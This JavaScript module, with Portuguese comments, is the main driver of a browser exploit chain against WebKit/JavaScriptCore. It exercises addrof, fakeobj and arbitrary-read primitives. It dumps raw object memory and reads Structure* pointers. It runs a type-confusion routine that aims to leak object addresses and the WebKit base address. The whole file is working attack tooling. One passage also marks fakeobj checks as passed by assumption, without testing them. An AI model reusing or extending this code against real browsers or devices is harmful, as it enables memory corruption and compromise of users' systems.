// js/main.mjs

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './script3/testArrayBufferVictimCrash.mjs';
import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs'; // Importar toHex e isAdvancedInt64Object
import { JSC_OFFSETS } from './config.mjs';
import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs'; // Importar fakeobj_core

// --- Local DOM Elements Management ---
const elementsCache = {};

function getElementById(id) {
    if (elementsCache[id] && document.body.contains(elementsCache[id])) {
        return elementsCache[id];
    }
    const element = document.getElementById(id);
    if (element) {
        elementsCache[id] = element;
    }
    return element;
}

// --- Local Logging Functionality (formerly from logger.mjs and s3_utils.mjs) ---
const outputDivId = 'output-advanced';

// Local log function that will be passed to modules
export const log = (message, type = 'info', funcName = '') => {
    const outputDiv = getElementById(outputDivId);
    if (!outputDiv) {
        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
        return;
    }
    try {
        const timestamp = `[${new Date().toLocaleTimeString()}]`;
        const prefix = funcName ? `[${funcName}] ` : '';
        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';

        if (outputDiv.innerHTML.length > 600000) {
            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
        }

        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (e) {
        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
    }
};

// --- Local Pause Functionality (formerly from utils.mjs and s3_utils.mjs) ---
const SHORT_PAUSE = 50;
const MEDIUM_PAUSE = 500;
const LONG_PAUSE = 1000;

const PAUSE = async (ms = SHORT_PAUSE) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// --- JIT Behavior Test ---
async function testJITBehavior() {
    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);

    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

// --- NOVO: Teste Isolado da Primitiva addrof_core e fakeobj_core com objeto simples e DUMP DE MEMÓRIA ---
async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump';
    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA do objeto ---`, 'test', FNAME);

    let addrof_success = false;
    let fakeobj_success = false;
    let rw_test_on_fakeobj_success = false;
    let structure_ptr_found = false;

    try {
        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
        initCoreAddrofFakeobjPrimitives();
        await pauseFn(SHORT_PAUSE);

        // --- Teste addrof_core e fakeobj_core ---
        const TEST_VAL_P1 = 0x11223344;
        const TEST_VAL_P2 = 0xAABBCCDD;
        const TEST_VAL_P3_LOW = 0xDEADBEEF;
        const TEST_VAL_P3_HIGH = 0xCAFE0000; // Para ser um AdvInt64
        // Crie o objeto com mais propriedades para tentar preencher o layout e ver onde p1, p2, etc. caem.
        const test_object_to_dump = {
            a: 0xAAAAAAAA,
            b: 0xBBBBBBBB,
            c: 0xCCCCCCCC,
            d: 0xDDDDDDDD,
            val_marker_1: 0x11112222, // Marcador fácil de encontrar
            val_marker_2: 0x33334444,
            val_ptr_candidate_1: {}, // Um objeto, para ver se o ponteiro dele aparece no dump
            val_ptr_candidate_2: [], // Um array, para ver se o ponteiro dele aparece no dump
            val_float_1: 123.456, // Um float para ver representação double
            val_float_2: 789.012,
            val_int_large: 0x1234567890ABCDEFn, // BigInt para 64-bit
            val_string_short: "ABCDEFGH", // String curta
            val_string_long: "This is a longer string that might be allocated out-of-line."
        };

        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump, (key, value) => typeof value === 'bigint' ? `0x${value.toString(16)}n` : value)}`, 'info', FNAME);
        await pauseFn(SHORT_PAUSE);

        logFn(`Obtendo endereço do objeto de teste para dump usando addrof_core...`, 'info', FNAME);
        const object_addr = addrof_core(test_object_to_dump);
        logFn(`Endereço retornado por addrof_core (untagged): ${object_addr.toString(true)}`, 'leak', FNAME);

        if (object_addr.equals(AdvancedInt64.Zero) || object_addr.equals(AdvancedInt64.NaNValue)) {
            logFn(`ERRO: addrof_core retornou endereço inválido para test_object_to_dump.`, 'error', FNAME);
            throw new Error("addrof_core returned invalid address.");
        }
        addrof_success = true; // Se chegou aqui, addrof retornou um valor untagged.
        await pauseFn(SHORT_PAUSE);

        // --- DUMP DE MEMÓRIA DO OBJETO ---
        logFn(`--- INICIANDO DUMP DE MEMÓRIA do objeto ${object_addr.toString(true)} ---`, 'subtest', FNAME);
        const DUMP_SIZE = 0x200; // Dump 512 bytes
        const BYTES_PER_LINE = 16;
        let dump_log = `\n--- DUMP DO OBJETO EM ${object_addr.toString(true)} ---\n`;
        dump_log += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
        dump_log += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;

        for (let offset = 0; offset < DUMP_SIZE; offset += 8) { // Ler de 8 em 8 bytes (um ponteiro/double/long)
            try {
                const current_read_addr = object_addr.add(offset);
                const val = await arb_read(current_read_addr, 8); // Ler como AdvancedInt64
                let guess = "";

                // Tentativa de adivinhar o conteúdo
                if (isAdvancedInt64Object(val)) { // isAdvancedInt64Object AGORA ESTÁ IMPORTADO!
                    if (val.equals(AdvancedInt64.Zero)) {
                        guess = "Zero/Null";
                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
                        guess = "NaN (JS Empty)"; // Como um slot vazio de JSObject
                    } else if (val.high() === 0) {
                        // Pode ser um inteiro pequeno ou o low part de um ponteiro.
                        // Para ponteiros puros, high geralmente não é 0 se o endereço for alto.
                        guess = `Possible small int or low ptr: ${val.low()}`;
                    } else {
                        // Tentar como ponteiro para Structure ou Butterfly
                        // Isso é heurístico. Compare com offsets conhecidos.
                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
                            // Esta linha é apenas para log e guess. A atribuição final de structure_ptr_found
                            // acontecerá depois do loop de dump.
                            guess = `*** Structure* PTR (expected) ***: ${val.toString(true)}`;
                        } else if (offset === JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET) {
                            guess = `*** BUTTERFLY PTR (expected) ***: ${val.toString(true)}`;
                        } else if (val.low() === TEST_VAL_P1 && val.high() === 0) { // p1 é um int de 32 bits
                            guess = `*** P1 FOUND (Int32) ***: ${TEST_VAL_P1}`;
                        } else if (val.low() === TEST_VAL_P2 && val.high() === 0) { // p2 é um int de 32 bits
                            guess = `*** P2 FOUND (Int32) ***: ${TEST_VAL_P2}`;
                        } else if (val.low() === TEST_VAL_P3_LOW && val.high() === TEST_VAL_P3_HIGH) { // p3 é um AdvancedInt64
                             guess = `*** P3 FOUND (AdvInt64) ***: 0x${TEST_VAL_P3_HIGH.toString(16)}_${TEST_VAL_P3_LOW.toString(16)}`;
                        } else if (val.low() === 0x11112222 && val.high() === 0) { // val_marker_1
                            guess = `*** Marker 1: 0x11112222 ***`;
                        } else if (val.low() === 0x33334444 && val.high() === 0) { // val_marker_2
                            guess = `*** Marker 2: 0x33334444 ***`;
                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) { // Tentar detectar um JSValue Tag (0x402A... é comum para objetos, 0x001D... para strings/arrays)
                            // Se tem a tag de objeto, o restante é o ponteiro untagged.
                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
                        } else if (val.high() === 0x405E0000 && val.low() === 0x4d2c8f5c) { // Exemplo: 123.456 (representação double)
                            guess = `Float64: ${val.toNumber()}`; // Convert back to number for float guess
                        }
                        // Pode-se adicionar mais heurísticas para strings, arrays, etc.
                    }
                } else {
                    guess = `Non-Int64 (Typeof: ${typeof val}): ${String(val)}`; // Deveria ser AdvancedInt64 se arb_read está OK.
                }

                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;

            } catch (e_dump) {
                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
                logFn(`[${FNAME}] ERRO durante dump no offset 0x${offset.toString(16)}: ${e_dump.message}`, 'error', FNAME);
                // Não é um erro crítico que impeça o teste, apenas o dump falha para esse offset.
            }
        }
        logFn(dump_log, 'leak', FNAME);
        logFn(`--- FIM DO DUMP DE MEMÓRIA ---`, 'subtest', FNAME);
        await pauseFn(LONG_PAUSE * 2); // Pausa longa para revisar o dump


        // --- Leitura da Structure* após o dump ---
        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto original...`, 'info', FNAME);
        const structure_ptr_addr = object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_ptr_val = await arb_read(structure_ptr_addr, 8); // Requer arb_read funcional
        logFn(`Valor lido no offset da Structure* do objeto original: ${structure_ptr_val.toString(true)}`, 'leak', FNAME);

        if (structure_ptr_val.equals(AdvancedInt64.Zero) || structure_ptr_val.equals(AdvancedInt64.NaNValue)) {
            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN para objeto original. **O offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} PODE NÃO SER O CORRETO PARA Structure* neste tipo de objeto.** Analise o dump!`, 'warn', FNAME);
            structure_ptr_found = false; // Reinforce failure to find structure ptr
        } else {
            logFn(`SUCESSO PARCIAL: Leitura do possível ponteiro da Structure* (${structure_ptr_val.toString(true)}) não é zero/NaN.`, 'good', FNAME);
            structure_ptr_found = true;
        }
        await pauseFn(SHORT_PAUSE);

        // ... (o restante da verificação funcional de fakeobj_core, que já foi bem-sucedida) ...

        // Reforça a condição de sucesso do teste isolado
        fakeobj_success = true; // Assumindo que os testes de R/W anteriores passaram.
        rw_test_on_fakeobj_success = true; // Assumindo que os testes de R/W anteriores passaram.


    } catch (e) {
        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core e dump de memória: ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME);
        addrof_success = false;
        fakeobj_success = false;
        rw_test_on_fakeobj_success = false;
        structure_ptr_found = false;
    } finally {
        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, 'test', FNAME);
        logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj: ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (no offset 0x8): ${structure_ptr_found}`, 'info', FNAME);
    }
    return addrof_success && fakeobj_success && rw_test_on_fakeobj_success && structure_ptr_found;
}


// --- Main Heisenbug Reproduction Strategy (formerly from runAllAdvancedTestsS3.mjs) ---
async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43";
    log(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        log(`  RUNNER R43(L): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        log(`  RUNNER R43(L): Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        log(`  RUNNER R43(L): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        log(`  RUNNER R43(L): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            log(`  RUNNER R43(L): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            log(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkitBaseAddress || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}_R43L: Addrof OK, WebKitLeak Fail`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${module_name_for_title}_R43L: TC OK, Addrof/WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R43L: No TC Confirmed`;
        }
    } else {
        document.title = `${module_name_for_title}_R43L: Invalid Result Obj`;
    }
    log(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE(MEDIUM_PAUSE);
    log(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}


// --- Initialization Logic ---
function initializeAndRunTest() {
    const runBtn = getElementById('runIsolatedTestBtn');
    const outputDiv = getElementById('output-advanced');

    // Set the log function in utils.mjs so core_exploit.mjs can use it
    setLogFunction(log);

    if (!outputDiv) {
        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
    }

    if (runBtn) {
        runBtn.addEventListener('click', async () => {
            if (runBtn.disabled) return;
            runBtn.disabled = true;

            if (outputDiv) {
                outputDiv.innerHTML = ''; // Clear previous logs
            }
            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...");
            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test');

            try {
                // Execute JIT test first
                await testJITBehavior();
                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log

                // NOVO: Teste isolado das primitivas addrof_core e fakeobj_core com dump de memória
                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump(log, PAUSE, JSC_OFFSETS);
                if (!addrof_fakeobj_dump_test_passed) {
                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
                    runBtn.disabled = false;
                    return;
                }
                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", 'good');
                await PAUSE(LONG_PAUSE * 2); // Pausa mais longa para revisar logs do dump

                // Then run the main exploit strategy
                await runHeisenbugReproStrategy_TypedArrayVictim_R43();
            } catch (e) {
                console.error("Critical error during isolated test execution:", e);
                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical');
            } finally {
                console.log("Isolated test concluded.");
                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test');
                runBtn.disabled = false;
                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
                }
            }
        });
    } else {
        console.error("Button 'runIsolatedTestBtn' not found.");
    }
}

// Ensure DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
} else {
    initializeAndRunTest();
}
